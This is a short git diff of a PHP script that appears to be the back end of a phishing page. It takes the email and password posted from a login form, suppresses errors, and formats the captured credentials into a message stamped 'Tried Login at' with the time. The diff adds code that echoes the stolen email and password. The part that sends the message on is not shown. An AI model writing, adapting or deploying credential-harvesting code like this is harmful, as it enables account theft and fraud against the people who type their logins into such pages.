@@ -1,12 +1,19 @@
 <?php
-
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // collect value of input field
+    $email = $_POST['email'];
+    $password = $_POST["password"];
+    if (empty($email)) {
+      echo "Name is empty";
+    } else {
+      echo $email;
+      echo $password;
+    }
+  }
 date_default_timezone_set("Asia/kolkata");
 error_reporting(0);
 
 $time = date("h:i a", time());
-
-$email = $_POST["email"];
-$password = $_POST["password"];
 
 $message = "Username : $email \nPassword: $password \nTried Login at $time IST";
 
